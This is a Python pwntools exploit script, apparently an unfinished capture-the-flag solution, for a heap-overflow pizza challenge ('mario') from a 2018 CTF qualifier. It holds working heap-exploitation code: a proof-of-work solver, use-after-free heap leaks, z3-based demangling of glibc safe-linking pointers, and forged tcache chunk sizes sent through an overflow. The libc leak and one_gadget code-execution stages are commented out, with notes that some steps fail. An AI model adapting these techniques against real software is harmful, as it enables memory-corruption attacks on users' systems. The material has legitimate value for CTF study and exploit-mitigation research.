from pwn import *
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'neww']

from z3 import *

# Updated for glibc 2.35 with safe-linking and tcache

def demangle_ptr(e):
    x = BitVec('x',64)
    s = Solver()
    s.add(x ^ (x >> 12) == e)
    s.check()
    model = s.model()
    print('model', model)
    return model[x].as_long()

def encode_ptr(e):
    return e ^ (e >> 12)


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def do_pow():
    messages = p.recvuntil(b"Solution:")
    messages = messages.split(b"\n")
    challenge = messages[1].split(b": ")[1]
    n = int(messages[2].split(b": ")[1])
    print(challenge, n)

    payload = solve_pow(challenge, n)
    print(b"Finish proof of work: ", payload)

    p.sendline(str(payload))

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(b"83b1db91.quals2018.oooverflow.io", 31337)
    do_pow()
else:
    p = process(b"./mario")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               cwatch execute "x/100gx 0x55555561f020-0x100"
               cwatch execute "x/24gx
               b *(0x555555400000+ 0x1d87)
               b *(0x555555400000 + 0x20f1)
               b *(0x555555400000 + 0x20bb)
               b *(0x555555400000 + 0x269a)
               b *(0x555555400000 + 0x28fe)
               b *(0x555555400000 + 0x243a)
               b *(0x555555400000 + 0x2f18)
               b *(0x555555400000 + 0x2ce8)
               b *(0x555555400000 + 0x2e95)
               """)

#                b *(0x555555554000 + 0x20f1) # after overflow
#                b *(0x555555554000 + 0x20bb) # before overflow in explanation
#                b *(0x555555554000 + 0x269a) # order
#                b *(0x555555554000 + 0x28fe) # cook pizza
#                b *(0x555555554000 + 0x243a) # angry leak
#                b *(0x555555554000 + 0x2f18) # admire 
               # b *(0x555555400000 + 0x2ce8) # create_approved_pizza
               # b *(0x555555400000 + 0x2e95) # free in cook_pizza


tomato = bytes.fromhex("F09f8d85")
chicken = bytes.fromhex("F09f9094")
banana = bytes.fromhex("F09f8d8c")
poo = bytes.fromhex("F09f92a9")
pineapple = bytes.fromhex("f09f8d8d")

def new(name):
    print(p.recvuntil(b"Choice:"))
    p.sendline(b"N")
    p.recvuntil(b"name?")
    p.sendline(name)

def login(name):
    print(p.recvuntil(b"Choice:"))
    p.sendline(b"L")
    print(p.recvuntil(b"name?"))
    p.sendline(name)

def cook(declare):
    p.recvuntil(b"Choice:")
    p.sendline(b"C")
    p.recvuntil(b"explain:")
    p.sendline(declare)
    print(p.recvuntil(b"USER MENU"))

def order(num, ingreds):
    p.recvuntil(b"Choice:")
    p.sendline(b"O")
    p.recvuntil(b"how many pizzas?")
    p.sendline(str(num)) 
    for i in range(num):
        print("[+] pizza {}, ingreds {}".format(i, ingreds[i]))
        try: 
            p.recvuntil(b"how many ingredients?")
        except:
            print(p.recvall())
        p.sendline(str(len(ingreds[i])))

        for j in ingreds[i]:
            print(p.recvuntil(b":"))
            p.sendline(j)

def admire():
    print(p.recvuntil(b"Choice:"))
    p.sendline(b"A")
    print(p.recvline())

def leave():
    p.recvuntil(b"Choice:")
    p.sendline(b"L")

# Overflow kicks out to login prompt, no need to leave
def overflow(buf):
    p.recvuntil(b"Choice:")
    p.sendline(b"P")
    print(p.recvuntil(b"explain yourself:"))
    p.sendline(buf)
    
def leak():
    print(p.recvuntil(b"Choice:"))
    p.sendline(b"W")
    print(p.recvuntil(b"say:"))
    return p.recvline()

print(b"[+] Leak phase")
print(b"[+] Heap leak phase")
new(b"AAAAAAAA")
# order(1, [[tomato]])
# cook(b"C"*290) # smallbin-sized declare, freed

order(17, [[tomato]]*1 + [[tomato + b"\xf0\x9f\xf0\x9f", pineapple[2:]+tomato]]*16)
cook(b"Q"*0x30) # description is pizza-sized (0x41) chunk, freed and placed in tcache
leave()

# print freed chunk containing heap leak
heap_leak = leak()
heap_leak = heap_leak[1:-1]
heap_leak = unpack(heap_leak, 'all') << 12
print(b"heap leak", hex(heap_leak))

# Libc leak 
print(b"[+] Libc leak phase")

# use overflow to overwrite size of a 0x71 tcache chunk to an unsorted bin size (> tcache max of 1032)

login('AAAAAAAA')
tcache_size = 0x501
fake_next_ptr = heap_leak + 0x100
fake_chunks = p64(heap_leak >> 12) 
fake_chunks += b"Z"*0x28 + p64(0) + p64(0x51) + p64(encode_ptr(fake_next_ptr)) # there's a 0x51 tcache chunk in between 0x41 and 0x71 chunk, forge it to keep 0x50 tcache bin intact
fake_chunks += b'Z'*0x38 + p64(0) + p64(tcache_size)
overflow(fake_chunks)

# Idea: create another angry user to use another UAF to leak libc 
# XXX: This doesn't work because we've messed up the heap, can't successfully order 17 pizzas

new(b"CCCCCCC")
# order(17, [[tomato]]*1 + [[tomato + b"\xf0\x9f\xf0\x9f", pineapple[2:]+tomato]]*16)
order(1, [[tomato]])
cook(b"F"*0x60) # description is allocated from 0x71 tcache bin, then freed into unsorted bin because we overwrote the size
leave()
# now we have unsorted bin libc address on heap...

# Idea: Overwrite the explanation ptr of first angry user to point to unsorted bin chunk so we can leak?
# Doesn't work because Customer is first thing on stack, before our overwrite... and we also only have one overwrite per user

# libc_leak = leak()
# libc_leak = libc_leak[1:-1]
# libc_leak = unpack(libc_leak, 'all') << 12
# print(b"libc leak", hex(libc_leak))

# # Offset calculated in gdb 
# libc_base = libc_leak - 0x3c4b78
# print(b"libc_base", hex(libc_base))
# one_gadget = libc_base + 0x4526a

# print('[+] exploit phase')
# # Get a Pizza on the heap inside our freed pizza-size explanation chunk
# new(b"BBBBBBBB")
# order(1, [[tomato]])
# cook('YYYY')
# leave()

# # # Offset calculated in gdb 
# # one_gadget_heap_addr = heap_leak-0xf90

# # # Perform the overflow of BBBB's pizza vtable ptr with ptr to one_gadget
# login('AAAAAAAA')
# overflow(p64(0xdeadbeef))
# # overflow(p64(one_gadget)*2 + b"Z"*144 + p64(one_gadget_heap_addr)*2) # we got kicked out to login prompt

# # # Print(B's pizzas, call one_gadget and win)
# login(b"BBBBBBBB")
# admire()
p.interactive()



